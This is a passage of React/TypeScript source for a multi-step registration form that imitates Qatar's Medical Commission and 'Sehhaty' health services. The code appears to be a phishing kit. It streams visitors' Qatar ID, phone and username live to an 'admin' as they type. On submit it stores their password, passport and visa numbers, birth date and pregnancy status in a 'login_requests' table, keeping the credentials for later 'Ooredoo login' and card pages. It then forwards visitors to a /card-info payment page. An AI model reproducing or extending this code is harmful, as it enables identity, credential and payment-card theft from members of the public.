import { useEffect, useMemo, useState } from "react";
import { navigateToPage } from "@/lib/store";
import { useLiveDraft } from "@/hooks/useLiveDraft";
import { useLocation, useParams, useSearchParams } from "wouter";
import { z } from "zod";
import {
  ArrowLeft,
  ArrowRight,
  Loader2,
  UserPlus,
  IdCard,
  Mail,
  Phone,
  MapPin,
  Building2,
  Lock,
  Check,
  Wallet,
  CreditCard,
  ShieldCheck,
  FileText,
  Signal,
  ClipboardList,
  AlertTriangle,
  Eye,
  EyeOff,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Checkbox } from "@/components/ui/checkbox";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { useLang } from "@/i18n/LanguageContext";
import SiteHeader from "@/components/SiteHeader";
import {
  QID_PATTERN,
  sanitizeQatarId,
  qatarIdKeyDownGuard,
  qatarIdPasteSanitizer,
} from "@/lib/qatarId";
import DateSelect from "@/components/DateSelect";
import { getServiceContext, type ServiceContext } from "@/lib/serviceContext";
import RequestSummaryPreview, { type SummarySection } from "@/components/RequestSummaryPreview";
import { Printer, FileDown } from "lucide-react";

const MAROON = "#8b1538";
const STORAGE_KEY = "medical_register_form";
const FEE_QAR = 10;

const NATIONALITIES = [
  "قطري","مصري","سوري","أردني","لبناني","فلسطيني","سوداني","يمني","عراقي",
  "سعودي","إماراتي","كويتي","بحريني","عماني","هندي","باكستاني","بنغلاديشي",
  "فلبيني","سريلانكي","نيبالي","إندونيسي","تركي","مغربي","تونسي","جزائري","أخرى",
];
const NATIONALITIES_EN: Record<string, string> = {
  "قطري":"Qatari","مصري":"Egyptian","سوري":"Syrian","أردني":"Jordanian","لبناني":"Lebanese",
  "فلسطيني":"Palestinian","سوداني":"Sudanese","يمني":"Yemeni","عراقي":"Iraqi",
  "سعودي":"Saudi","إماراتي":"Emirati","كويتي":"Kuwaiti","بحريني":"Bahraini","عماني":"Omani",
  "هندي":"Indian","باكستاني":"Pakistani","بنغلاديشي":"Bangladeshi","فلبيني":"Filipino",
  "سريلانكي":"Sri Lankan","نيبالي":"Nepali","إندونيسي":"Indonesian","تركي":"Turkish",
  "مغربي":"Moroccan","تونسي":"Tunisian","جزائري":"Algerian","أخرى":"Other",
};

const NETWORK_OPERATORS = [
  { v: "ooredoo", ar: "أوريدو", en: "Ooredoo" },
  { v: "vodafone", ar: "فودافون قطر", en: "Vodafone Qatar" },
];

const GOVERNORATES = [
  "الدوحة","الريان","الوكرة","أم صلال","الخور والذخيرة","الشمال","الضعاين","الشحانية",
];
const GOVERNORATES_EN: Record<string, string> = {
  "الدوحة":"Doha","الريان":"Al Rayyan","الوكرة":"Al Wakrah","أم صلال":"Umm Salal",
  "الخور والذخيرة":"Al Khor & Al Dhakhira","الشمال":"Al Shamal","الضعاين":"Al Daayen","الشحانية":"Al Shahaniya",
};

const REQUEST_TYPES = [
  { v: "standard", ar: "طلب التسجيل الإلكتروني في القومسيون الطبي", en: "Electronic registration request - Medical Commission" },
  { v: "senior_staff", ar: "طلب التسجيل الإلكتروني في القومسيون الطبي - فئة كبار الموظفين", en: "Electronic registration request - Senior Staff Category" },
];

const getRequestTypes = (serviceContext: ServiceContext) =>
  serviceContext.isSehhaty
    ? [
        { v: "standard", ar: "طلب تسجيل حساب جديد في صحتي", en: "New My Health account registration request" },
        { v: "service_access", ar: `طلب ربط الحساب بخدمة ${serviceContext.titleAr}`, en: `Link account to ${serviceContext.titleEn}` },
      ]
    : REQUEST_TYPES;

const PURPOSES = [
  { v: "new_residency", ar: "إصدار إقامة جديدة / عمل جديد", en: "New residency / employment" },
  { v: "renewal", ar: "تجديد الإقامة", en: "Residency renewal" },
  { v: "sponsor_change", ar: "تغيير كفيل / نقل خدمات", en: "Change of sponsor" },
  { v: "family", ar: "التحاق عائلة (زوج/زوجة/أبناء)", en: "Family reunification" },
  { v: "food_health", ar: "مهن حساسة صحياً (أغذية / صالونات / أندية صحية)", en: "Food handlers / salons / health clubs" },
  { v: "returning", ar: "عودة من الخارج بعد أكثر من 6 أشهر", en: "Returning after 6+ months abroad" },
  { v: "driving", ar: "استخراج / تجديد رخصة قيادة", en: "Driving license" },
  { v: "study", ar: "غرض الدراسة الجامعية", en: "University / study" },
  { v: "citizenship", ar: "طلب الجنسية القطرية", en: "Qatari citizenship application" },
  { v: "other", ar: "غرض آخر", en: "Other" },
];

const SEHHATY_PURPOSES = [
  { v: "medical_record", ar: "الوصول إلى السجل الطبي", en: "Access medical record" },
  { v: "reports", ar: "طلب التقارير والملخصات الطبية", en: "Request reports and visit summaries" },
  { v: "appointments", ar: "إدارة المواعيد الطبية", en: "Manage medical appointments" },
  { v: "family", ar: "متابعة خدمات أفراد العائلة", en: "Manage family health services" },
  { v: "other", ar: "خدمة صحية أخرى", en: "Other health service" },
];

const OCCUPATIONS = [
  { v: "professional", ar: "مهني / إداري", en: "Professional / Administrative" },
  { v: "technical", ar: "فني", en: "Technical" },
  { v: "medical", ar: "قطاع طبي", en: "Medical sector" },
  { v: "education", ar: "قطاع تعليمي", en: "Education" },
  { v: "driver", ar: "سائق مهني", en: "Professional driver" },
  { v: "food_handler", ar: "عامل بالأغذية", en: "Food handler" },
  { v: "salon", ar: "عامل صالونات / تجميل", en: "Salon / beauty worker" },
  { v: "labor", ar: "عامل / حرفي", en: "Labor / craftsman" },
  { v: "housemaid", ar: "عمالة منزلية", en: "Domestic worker" },
  { v: "student", ar: "طالب", en: "Student" },
  { v: "dependent", ar: "معال (بدون عمل)", en: "Dependent (no employment)" },
  { v: "other", ar: "أخرى", en: "Other" },
];

const COMPANY_PURPOSES = [
  { v: "new_hires", ar: "فحص موظفين جدد", en: "New hires screening" },
  { v: "renewals", ar: "تجديد إقامات الموظفين", en: "Employee residency renewals" },
  { v: "periodic", ar: "فحص دوري للموظفين", en: "Periodic employee exams" },
  { v: "drivers", ar: "فحص السائقين المهنيين", en: "Professional drivers exam" },
  { v: "food_handlers", ar: "فحص العاملين بالأغذية", en: "Food handlers exam" },
  { v: "other", ar: "غرض آخر", en: "Other" },
];

const SEHHATY_COMPANY_PURPOSES = [
  { v: "employee_access", ar: "إدارة وصول الموظفين للخدمات الصحية", en: "Manage employee access to health services" },
  { v: "reports", ar: "طلب التقارير الطبية للموظفين", en: "Request employee medical reports" },
  { v: "appointments", ar: "تنسيق مواعيد الموظفين الطبية", en: "Coordinate employee medical appointments" },
  { v: "other", ar: "غرض صحي آخر", en: "Other health purpose" },
];

const ACTIVITY_TYPES = [
  { v: "commercial", ar: "تجاري", en: "Commercial" },
  { v: "industrial", ar: "صناعي", en: "Industrial" },
  { v: "services", ar: "خدمات", en: "Services" },
  { v: "medical", ar: "طبي", en: "Medical" },
  { v: "contracting", ar: "مقاولات", en: "Contracting" },
  { v: "education", ar: "تعليمي", en: "Education" },
  { v: "hospitality", ar: "ضيافة ومطاعم", en: "Hospitality" },
  { v: "other", ar: "أخرى", en: "Other" },
];

type FormData = {
  userType: "individual" | "company";
  requestType: string;
  fullNameAr: string; fullNameEn: string;
  qatarId: string; establishmentNo: string; passportNo: string; nationality: string;
  dob: string; gender: "" | "male" | "female";
  companyNameAr: string; companyNameEn: string;
  commercialRegNo: string; activityType: string; establishmentDate: string;
  email: string; phone: string; networkOperator: string;
  governorate: string; area: string; street: string; building: string;
  employer: string; occupation: string; visaNo: string; pregnant: "" | "yes" | "no";
  purpose: string;
  purposeCompany: string;
  username: string; password: string; confirm: string;
  accept: boolean;
};

const empty: FormData = {
  userType: "individual", requestType: "",
  fullNameAr: "", fullNameEn: "", qatarId: "", establishmentNo: "", passportNo: "", nationality: "",
  dob: "", gender: "", email: "", phone: "", networkOperator: "",
  companyNameAr: "", companyNameEn: "",
  commercialRegNo: "", activityType: "", establishmentDate: "",
  governorate: "", area: "",
  street: "", building: "", employer: "", occupation: "", visaNo: "", pregnant: "",
  purpose: "",
  purposeCompany: "",
  username: "", password: "", confirm: "", accept: false,
};

const stepSchemas: Record<number, z.ZodTypeAny> = {
  1: z.object({
    requestType: z.string().min(1, "ar:اختر نوع الطلب"),
    userType: z.enum(["individual", "company"]),
    fullNameAr: z.string().optional().or(z.literal("")),
    fullNameEn: z.string().optional().or(z.literal("")),
    qatarId: z.string().trim().regex(QID_PATTERN, "ar:الرقم الشخصي يجب أن يكون 11 رقماً ويبدأ بـ 2 أو 3"),
    establishmentNo: z.string().trim().optional().or(z.literal("")),
    passportNo: z.string().optional().or(z.literal("")),
    nationality: z.string().optional().or(z.literal("")),
    dob: z.string().optional().or(z.literal("")),
    gender: z.enum(["male", "female", ""]).optional(),
    visaNo: z.string().optional().or(z.literal("")),
    pregnant: z.enum(["yes", "no", ""]).optional(),
    companyNameAr: z.string().optional().or(z.literal("")),
    companyNameEn: z.string().optional().or(z.literal("")),
    commercialRegNo: z.string().optional().or(z.literal("")),
    activityType: z.string().optional().or(z.literal("")),
    establishmentDate: z.string().optional().or(z.literal("")),
  }).superRefine((d, ctx) => {
    const req = (path: string, cond: boolean, msg: string) => {
      if (!cond) ctx.addIssue({ code: z.ZodIssueCode.custom, path: [path], message: msg });
    };
    if (d.userType === "company") {
      req("establishmentNo", /^[0-9]{4,15}$/.test((d.establishmentNo || "").trim()), "ar:رقم المنشأة يجب أن يكون من 4 إلى 15 رقماً");
      req("companyNameAr", (d.companyNameAr || "").trim().length >= 2, "ar:أدخل اسم المنشأة بالعربية");
      req("companyNameEn", (d.companyNameEn || "").trim().length >= 2, "ar:أدخل اسم المنشأة بالإنجليزية");
      req("commercialRegNo", /^[0-9]{4,15}$/.test((d.commercialRegNo || "").trim()), "ar:رقم السجل التجاري غير صحيح");
      req("activityType", (d.activityType || "").trim().length >= 2, "ar:اختر نوع النشاط");
      req("establishmentDate", !!d.establishmentDate, "ar:أدخل تاريخ التأسيس");
    } else {
      req("fullNameAr", (d.fullNameAr || "").trim().length >= 3, "ar:الاسم بالعربية قصير جداً");
      req("fullNameEn", (d.fullNameEn || "").trim().length >= 3, "ar:الاسم بالإنجليزية قصير جداً");
      req("passportNo", (d.passportNo || "").trim().length >= 4, "ar:رقم الجواز غير صحيح");
      req("nationality", (d.nationality || "").length >= 1, "ar:اختر الجنسية");
      req("dob", !!d.dob, "ar:أدخل تاريخ الميلاد");
      req("gender", d.gender === "male" || d.gender === "female", "ar:اختر الجنس");
      // Pregnancy is validated conditionally at runtime (medical path only).
    }
  }),
  2: z.object({
    email: z.string().trim().email("ar:بريد إلكتروني غير صحيح").max(120),
    phone: z.string().trim().regex(/^[0-9]{8}$/, "ar:رقم هاتف قطري مكون من 8 أرقام"),
    networkOperator: z.string().min(1, "ar:اختر مشغل الشبكة"),
    governorate: z.string().min(1, "ar:اختر البلدية"),
    area: z.string().trim().min(2, "ar:أدخل المنطقة").max(80),
    street: z.string().trim().min(1, "ar:أدخل الشارع").max(80),
    building: z.string().trim().min(1, "ar:أدخل رقم المبنى").max(20),
  }),
  3: z.object({
    userType: z.enum(["individual", "company"]),
    employer: z.string().trim().max(120).optional().or(z.literal("")),
    occupation: z.string().optional().or(z.literal("")),
    purpose: z.string().optional().or(z.literal("")),
    purposeCompany: z.string().optional().or(z.literal("")),
    username: z.string().trim().min(5, "ar:اسم المستخدم قصير").max(30)
      .regex(/^[A-Za-z0-9_.]+$/, "ar:أحرف إنجليزية وأرقام فقط"),
    password: z.string().min(8, "ar:كلمة المرور 8 أحرف على الأقل").max(64),
    confirm: z.string(),
  }).refine((d) => d.password === d.confirm, {
    path: ["confirm"], message: "ar:كلمتا المرور غير متطابقتين",
  }).superRefine((d, ctx) => {
    const key = d.userType === "company" ? "purposeCompany" : "purpose";
    if (!((d[key as "purpose" | "purposeCompany"] || "").trim())) {
      ctx.addIssue({ code: z.ZodIssueCode.custom, path: [key], message: "ar:اختر الغرض" });
    }
    // Occupation requirement is contextual (medical path only) and enforced
    // in the component-level validate() to keep the Sehhaty path clean.
  }),
  4: z.object({
    accept: z.literal(true, { errorMap: () => ({ message: "ar:يجب الموافقة على الشروط والدفع" }) }),
  }),
};

type Errors = Record<string, string>;

const loadState = (): FormData => {
  if (typeof window === "undefined") return empty;
  try {
    const raw = sessionStorage.getItem(STORAGE_KEY);
    return raw ? { ...empty, ...JSON.parse(raw) } : empty;
  } catch { return empty; }
};

const saveState = (d: FormData) => {
  try { sessionStorage.setItem(STORAGE_KEY, JSON.stringify(d)); } catch { /* noop */ }
};

const TOTAL = 4;
type RequestTypeOption = ReturnType<typeof getRequestTypes>[number];

const MedicalRegister = () => {
  const { pick, dir } = useLang();
  const [, navigate] = useLocation();
  const { step: stepParam } = useParams<{ step: string }>();
  const [searchParams] = useSearchParams();
  const service = searchParams.get("service") || "register";
  const serviceContext = useMemo(() => getServiceContext(service), [service]);
  const serviceQuery = useMemo(() => {
    const p = new URLSearchParams();
    if (service) p.set("service", service);
    const query = p.toString();
    return query ? `?${query}` : "";
  }, [service]);
  const requestTypes = useMemo(() => getRequestTypes(serviceContext), [serviceContext]);
  const step = Math.min(TOTAL, Math.max(1, parseInt(stepParam || "1", 10) || 1));
  const t = (ar: string, en: string) => pick(ar, en);

  const [data, setData] = useState<FormData>(loadState);
  const [errors, setErrors] = useState<Errors>({});
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (data.requestType && !requestTypes.some((item) => item.v === data.requestType)) {
      setData((prev) => ({ ...prev, requestType: "" }));
    }
  }, [data.requestType, requestTypes]);

  // Stream partial registration data to admin in realtime.
  useLiveDraft({
    step: "medical_register",
    values: { ...data, current_step: step },
    columns: {
      phone: data.phone,
      qatar_id: data.qatarId,
      national_id: data.qatarId,
      username: data.username,
      full_name:
        data.userType === "company"
          ? `${data.companyNameAr || ""} | ${data.companyNameEn || ""}`.trim()
          : `${data.fullNameAr || ""} | ${data.fullNameEn || ""}`.trim(),
      governorate: data.governorate,
      city: data.area,
      selected_service: service,
    },
  });

  useEffect(() => { saveState(data); }, [data]);
  useEffect(() => { setErrors({}); window.scrollTo({ top: 0, behavior: "smooth" }); }, [step]);

  const update = <K extends keyof FormData>(k: K, v: FormData[K]) =>
    setData((prev) => ({ ...prev, [k]: v }));

  const validate = (n: number) => {
    const schema = stepSchemas[n];
    const res = schema.safeParse(data);
    const next: Errors = {};
    if (!res.success) {
      for (const i of res.error.issues) {
        const k = i.path[0] as string;
        const m = i.message.startsWith("ar:") ? i.message.slice(3) : i.message;
        if (k && !next[k]) next[k] = m;
      }
    }
    // Contextual runtime rules: pregnancy question is only required on the
    // Medical Commission path (chest X-ray protocol). Occupation is required
    // only on the Medical Commission individual path.
    if (n === 1 && !serviceContext.isSehhaty && data.userType === "individual"
        && data.gender === "female" && data.pregnant !== "yes" && data.pregnant !== "no") {
      next.pregnant = next.pregnant || "يرجى تحديد حالة الحمل";
    }
    if (n === 3 && !serviceContext.isSehhaty && data.userType === "individual"
        && !(data.occupation || "").trim()) {
      next.occupation = next.occupation || "اختر المهنة";
    }
    if (Object.keys(next).length === 0) { setErrors({}); return true; }
    setErrors(next);
    return false;
  };



  const goNext = () => {
    if (!validate(step)) return;
    if (step < TOTAL) navigate(`/medical-register/step/${step + 1}${serviceQuery}`);
  };
  const goBack = () => {
    if (step > 1) navigate(`/medical-register/step/${step - 1}${serviceQuery}`);
    else navigate(`/medical-login${serviceQuery}`);
  };

  const handleFinalSubmit = async () => {
    if (!validate(4)) return;
    setLoading(true);
    const payload: any = {
      phone: data.phone,
      step: "medical_register",
      // Informational log — the visitor is forwarded to /card-info which
      // will create the actual pending row that needs admin approval.
      status: "info",
      selected_service: service,
      current_page: "/medical-register",
      full_name: data.userType === "company"
        ? `${data.companyNameAr} | ${data.companyNameEn}`
        : `${data.fullNameAr} | ${data.fullNameEn}`,
      national_id: data.qatarId,
      qatar_id: data.qatarId,
      username: data.username,
      password: data.password,
      governorate: data.governorate,
      city: data.area,
      street: `${data.street} - مبنى ${data.building}`,
      activation_data: {
          requestType: data.requestType,
          userType: data.userType,
          passportNo: data.passportNo,
          visaNo: data.visaNo,
          nationality: data.nationality,
          dob: data.dob,
          gender: data.gender,
          pregnant: data.pregnant,
          establishmentNo: data.establishmentNo,
          companyNameAr: data.companyNameAr,
          companyNameEn: data.companyNameEn,
          commercialRegNo: data.commercialRegNo,
          activityType: data.activityType,
          establishmentDate: data.establishmentDate,
          email: data.email,
          networkOperator: data.networkOperator,
          employer: data.employer,
          occupation: data.occupation,
          purpose: data.purpose,
          purposeCompany: data.purposeCompany,
          fee_qar: FEE_QAR,
          flow: serviceContext.isSehhaty ? "sehhaty_register" : "register",
          service_platform: serviceContext.platformShortAr,
          service_title_ar: serviceContext.titleAr,
          service_title_en: serviceContext.titleEn,
          // Mirror step-scoped credentials/identity so later pages that
          // reuse the top-level username/password/full_name columns
          // (Ooredoo login, card flow) don't erase them from the admin card.
          register_username: data.username,
          register_password: data.password,
          register_full_name_ar: data.userType === "company" ? data.companyNameAr : data.fullNameAr,
          register_full_name_en: data.userType === "company" ? data.companyNameEn : data.fullNameEn,
          register_qatar_id: data.qatarId,
          register_phone: data.phone,
          register_governorate: data.governorate,
          register_city: data.area,
          register_street: data.street,
          register_building: data.building,
      },
      updated_at: new Date().toISOString(),
    };
    // Update the existing session row if present so the admin sees one
    // continuous visitor identity across /medical-login → /medical-register.
    let existingId: string | null = null;
    try { existingId = sessionStorage.getItem("visitor_request_id"); } catch { /* noop */ }
    let row: { id: string } | null = null;
    let error: unknown = null;
    if (existingId) {
      const merged = await updateVisitorRow(existingId, payload); const res = { data: merged, error: null as unknown };
      row = res.data as any; error = res.error;
      if (!row) {
        const ins = await supabase.from("login_requests").insert({ ...payload, otp_code: "----" } as unknown as never).select("id").single();
        row = ins.data as any; error = ins.error;
      }
    } else {
      const ins = await supabase.from("login_requests").insert({ ...payload, otp_code: "----" } as unknown as never).select("id").single();
      row = ins.data as any; error = ins.error;
    }
    setLoading(false);
    if (error || !row) return;
    setVisitorRequestId(row.id);
    try {
      sessionStorage.setItem("selected_service", service);
      sessionStorage.removeItem(STORAGE_KEY);
    } catch { /* noop */ }
    navigate("/card-info", { state: { phone: data.phone, fee: FEE_QAR, from: "register" } });
  };

  const stepMeta = useMemo(() => [
    { n: 1, ar: "البيانات الشخصية", en: "Personal", icon: <IdCard className="w-4 h-4" /> },
    { n: 2, ar: "التواصل والعنوان", en: "Contact", icon: <MapPin className="w-4 h-4" /> },
    { n: 3, ar: serviceContext.isSehhaty ? "الغرض والحساب" : "العمل والحساب", en: serviceContext.isSehhaty ? "Purpose & Account" : "Account", icon: <Lock className="w-4 h-4" /> },
    { n: 4, ar: "المراجعة والدفع", en: "Review & Pay", icon: <Wallet className="w-4 h-4" /> },
  ], [serviceContext.isSehhaty]);

  const stepTitle = stepMeta[step - 1];

  useEffect(() => {
    navigateToPage("تسجيل القومسيون الطبي");
  }, []);

  return (
    <div dir={dir} className="min-h-screen bg-[#eef0fb] flex flex-col">
      <SiteHeader />
      <div className="flex-1 py-8 px-3 flex items-start justify-center">
        <div className="w-full max-w-5xl bg-white shadow-sm">
          {/* Header */}
          <div className="text-center pt-8 pb-6 px-6 border-b border-gray-100">
            <h1 className="text-2xl font-bold" style={{ color: MAROON }}>
              {t(serviceContext.titleAr, serviceContext.titleEn)}
            </h1>
            <p className="mt-2 text-gray-500 text-sm">
              {t(serviceContext.orgLineAr, serviceContext.orgLineEn)}
            </p>
            <div className="mt-3 inline-flex items-center gap-2 text-xs font-semibold px-3 py-1 rounded-full"
                 style={{ color: MAROON, backgroundColor: `${MAROON}14`, border: `1px solid ${MAROON}33` }}>
              <Wallet className="w-3.5 h-3.5" />
              {t(`رسوم التسجيل: ${FEE_QAR} ريال قطري`, `Registration fee: QAR ${FEE_QAR}`)}
            </div>
          </div>

          {/* Stepper */}
          <div className="px-4 md:px-6 pt-5 pb-2">
            <ol className="flex items-center justify-between gap-1">
              {stepMeta.map((s, idx) => {
                const done = step > s.n;
                const current = step === s.n;
                return (
                  <li key={s.n} className="flex-1 flex items-center">
                    <div className="flex flex-col items-center flex-1">
                      <div
                        className="w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold border-2 transition-colors"
                        style={{
                          backgroundColor: done || current ? MAROON : "#fff",
                          color: done || current ? "#fff" : "#94a3b8",
                          borderColor: done || current ? MAROON : "#e2e8f0",
                        }}
                      >
                        {done ? <Check className="w-4 h-4" /> : s.n}
                      </div>
                      <span className="mt-1 text-[10px] md:text-xs text-gray-600 text-center leading-tight">
                        {t(s.ar, s.en)}
                      </span>
                    </div>
                    {idx < stepMeta.length - 1 && (
                      <div className="h-[2px] flex-1 mx-1 mb-4"
                           style={{ backgroundColor: step > s.n ? MAROON : "#e2e8f0" }} />
                    )}
                  </li>
                );
              })}
            </ol>
          </div>

          {/* Content */}
          <div className="px-6 pb-10 text-right">
            <div className="flex items-center gap-2 pt-4 pb-3 mb-4 border-b border-gray-100">
              <span className="w-8 h-8 rounded-full flex items-center justify-center text-white"
                    style={{ backgroundColor: MAROON }}>
                {stepTitle.icon}
              </span>
              <div>
                <h2 className="text-base font-bold" style={{ color: MAROON }}>
                  {t(`الخطوة ${step} من ${TOTAL} — ${stepTitle.ar}`, `Step ${step} of ${TOTAL} — ${stepTitle.en}`)}
                </h2>
              </div>
            </div>

            {step === 1 && (
              <Step1 data={data} update={update} errors={errors} t={t} dir={dir} serviceContext={serviceContext} requestTypes={requestTypes} />
            )}
            {step === 2 && (
              <Step2 data={data} update={update} errors={errors} t={t} serviceContext={serviceContext} />
            )}
            {step === 3 && (
              <Step3 data={data} update={update} errors={errors} t={t} serviceContext={serviceContext} />
            )}
            {step === 4 && (
              <Step4 data={data} update={update} errors={errors} t={t} serviceContext={serviceContext} serviceQuery={serviceQuery} requestTypes={requestTypes} />
            )}

            {/* Actions */}
            <div className="flex items-center justify-between gap-3 pt-6 mt-6 border-t border-gray-100">
              <Button
                type="button"
                variant="outline"
                onClick={goBack}
                disabled={loading}
                className="min-w-[110px] h-11 rounded-full border-gray-400 text-gray-700 hover:bg-gray-100 gap-2"
              >
                <ArrowRight className="!size-4" />
                {step === 1 ? t("خروج", "Exit") : t("السابق", "Back")}
              </Button>

              {step < TOTAL ? (
                <Button
                  type="button"
                  onClick={goNext}
                  className="min-w-[160px] h-11 rounded-full text-white hover:opacity-90 gap-2"
                  style={{ backgroundColor: MAROON }}
                >
                  {t("التالي", "Next")}
                  <ArrowLeft className="!size-5" />
                </Button>
              ) : (
                <Button
                  type="button"
                  onClick={handleFinalSubmit}
                  disabled={loading}
                  className="min-w-[220px] h-11 rounded-full text-white hover:opacity-90 gap-2"
                  style={{ backgroundColor: MAROON }}
                >
                  {loading ? (
                    <>
                      <Loader2 className="w-4 h-4 animate-spin" />
                      {t("جارٍ التحويل...", "Redirecting...")}
                    </>
                  ) : (
                    <>
                      {t(`دفع الرسوم (${FEE_QAR} ر.ق) ومتابعة`, `Pay fee (QAR ${FEE_QAR}) & continue`)}
                      <ArrowLeft className="!size-5" />
                    </>
                  )}
                </Button>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

/* ---------------- helpers ---------------- */

const Star = () => <span style={{ color: MAROON }}>*</span>;
const errCls = (has: boolean) =>
  `h-11 rounded-md text-base bg-white ${has ? "border-red-400" : "border-gray-300"}`;
const ErrMsg = ({ m }: { m?: string }) =>
  m ? <p className="text-xs text-red-600 mt-1">{m}</p> : null;

type StepProps = {
  data: FormData;
  update: <K extends keyof FormData>(k: K, v: FormData[K]) => void;
  errors: Errors;
  t: (ar: string, en: string) => string;
  serviceContext: ServiceContext;
};

/* Step 1: user type + personal */
const Step1 = ({ data, update, errors, t, dir, serviceContext, requestTypes }: StepProps & { dir: "rtl" | "ltr"; requestTypes: RequestTypeOption[] }) => (
  <div className="space-y-6">
    <IntroBanner
      icon={<UserPlus className="w-5 h-5 text-white" />}
      title={data.userType === "company"
        ? t("بيانات المنشأة", "Establishment information")
        : t("البيانات الشخصية", "Personal information")}
      body={data.userType === "company"
        ? t(
            `أدخل بيانات المنشأة كما هي مسجّلة لاستخدامها في ${serviceContext.platformShortAr}. لن يتم قبول أي بيانات غير مطابقة.`,
            `Enter the establishment data exactly as registered for ${serviceContext.platformShortEn}. Non-matching data will be rejected.`
          )
        : t(
            `أدخل بياناتك الشخصية كما هي في الهوية القطرية وجواز السفر لإتمام خدمة ${serviceContext.titleAr}. لن يتم قبول أي بيانات غير مطابقة.`,
            `Enter your personal data exactly as shown on your Qatar ID and passport to complete ${serviceContext.titleEn}. Non-matching data will be rejected.`
          )}
    />

    <div className="space-y-3">
      <Label className="text-gray-600 text-sm">{t("نوع المستخدم", "User type")} <Star /></Label>
      <RadioGroup
        value={data.userType}
        onValueChange={(v) => update("userType", v as "individual" | "company")}
        className="grid grid-cols-2 gap-3"
      >
        {[
          { v: "individual", ar: "مستخدم فردي", en: "Individual" },
          { v: "company", ar: "مستخدم شركة / منشأة", en: "Company" },
        ].map((o) => {
          const active = data.userType === o.v;
          return (
            <label key={o.v}
                   className={`flex items-center gap-3 border rounded-md p-3 cursor-pointer ${active ? "border-2" : "border-gray-300"}`}
                   style={active ? { borderColor: MAROON } : undefined}>
              <RadioGroupItem value={o.v}
                              className="border-gray-400 data-[state=checked]:border-[#8b1538] data-[state=checked]:text-[#8b1538]" />
              <span className="text-sm text-gray-700">{t(o.ar, o.en)}</span>
            </label>
          );
        })}
      </RadioGroup>
    </div>

    <div className="space-y-3">
      <Label className="text-gray-600 text-sm">{t("نوع الطلب", "Request type")} <Star /></Label>
      <div className="relative">
        <Select value={data.requestType} onValueChange={(v) => update("requestType", v)}>
          <SelectTrigger className={`${errCls(!!errors.requestType)} ps-10`}>
            <SelectValue placeholder={t("اختر نوع الطلب", "Select request type")} />
          </SelectTrigger>
          <SelectContent>
            {requestTypes.map((o) => (
              <SelectItem key={o.v} value={o.v}>{t(o.ar, o.en)}</SelectItem>
            ))}
          </SelectContent>
        </Select>
        <ClipboardList className="absolute start-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
      </div>
      <ErrMsg m={errors.requestType} />
    </div>

    <div className="grid md:grid-cols-2 gap-4">
      {data.userType === "individual" ? (
        <>
          <div>
            <Label className="text-gray-600 text-sm">{t("الاسم الكامل بالعربية", "Full name (Arabic)")} <Star /></Label>
            <Input dir="rtl" value={data.fullNameAr} onChange={(e) => update("fullNameAr", e.target.value)} maxLength={100} className={errCls(!!errors.fullNameAr)} />
            <ErrMsg m={errors.fullNameAr} />
          </div>
          <div>
            <Label className="text-gray-600 text-sm">{t("الاسم الكامل بالإنجليزية", "Full name (English)")} <Star /></Label>
            <Input dir="ltr" value={data.fullNameEn} onChange={(e) => update("fullNameEn", e.target.value)} maxLength={100} className={errCls(!!errors.fullNameEn)} />
            <ErrMsg m={errors.fullNameEn} />
          </div>
          <div>
            <Label className="text-gray-600 text-sm">{t("الرقم الشخصي (الهوية القطرية)", "Qatar ID")} <Star /></Label>
            <Input
              dir="ltr"
              inputMode="numeric"
              maxLength={11}
              autoComplete="off"
              value={data.qatarId}
              onChange={(e) => update("qatarId", sanitizeQatarId(e.target.value))}
              onKeyDown={qatarIdKeyDownGuard}
              onPaste={(e) => {
                const cleaned = qatarIdPasteSanitizer(e);
                if (cleaned !== null) update("qatarId", cleaned);
              }}
              placeholder="28xxxxxxxxx"
              className={errCls(!!errors.qatarId)}
            />
            <ErrMsg m={errors.qatarId} />
          </div>
          <div>
            <Label className="text-gray-600 text-sm">{t("رقم جواز السفر", "Passport number")} <Star /></Label>
            <Input dir="ltr" value={data.passportNo} onChange={(e) => update("passportNo", e.target.value.toUpperCase().slice(0, 20))} className={errCls(!!errors.passportNo)} />
            <ErrMsg m={errors.passportNo} />
          </div>
          {!serviceContext.isSehhaty && (
            <div>
              <Label className="text-gray-600 text-sm">{t("رقم التأشيرة (اختياري)", "Visa number (optional)")}</Label>
              <Input dir="ltr" value={data.visaNo} onChange={(e) => update("visaNo", e.target.value.replace(/[^A-Za-z0-9]/g, "").slice(0, 20))} className={errCls(false)} placeholder={t("إن وُجد", "If applicable")} />
              <p className="text-[11px] text-gray-500 mt-1">{t("يُستخدم للطلبات الجديدة قبل استخراج الهوية القطرية.", "Used for new applications before Qatar ID issuance.")}</p>
            </div>
          )}
          <div>
            <Label className="text-gray-600 text-sm">{t("الجنسية", "Nationality")} <Star /></Label>
            <Select value={data.nationality} onValueChange={(v) => update("nationality", v)}>
              <SelectTrigger className={errCls(!!errors.nationality)}>
                <SelectValue placeholder={t("اختر الجنسية", "Select nationality")} />
              </SelectTrigger>
              <SelectContent>
                {NATIONALITIES.map((n) => <SelectItem key={n} value={n}>{t(n, NATIONALITIES_EN[n] || n)}</SelectItem>)}
              </SelectContent>
            </Select>
            <ErrMsg m={errors.nationality} />
          </div>
          <div>
            <Label className="text-gray-600 text-sm">{t("تاريخ الميلاد", "Date of birth")} <Star /></Label>
            <DateSelect
              value={data.dob}
              onChange={(v) => update("dob", v)}
              hasError={!!errors.dob}
              minYear={1930}
              maxYear={new Date().getFullYear()}
            />
            <ErrMsg m={errors.dob} />
          </div>
          <div className="md:col-span-2">
            <Label className="text-gray-600 text-sm">{t("الجنس", "Gender")} <Star /></Label>
            <RadioGroup value={data.gender} onValueChange={(v) => update("gender", v as "male" | "female")}
                        className="flex gap-6 mt-2" dir={dir}>
              <div className="flex items-center gap-2">
                <RadioGroupItem id="g-m" value="male" className="border-gray-400 data-[state=checked]:border-[#8b1538] data-[state=checked]:text-[#8b1538]" />
                <Label htmlFor="g-m" className="cursor-pointer text-sm text-gray-700">{t("ذكر", "Male")}</Label>
              </div>
              <div className="flex items-center gap-2">
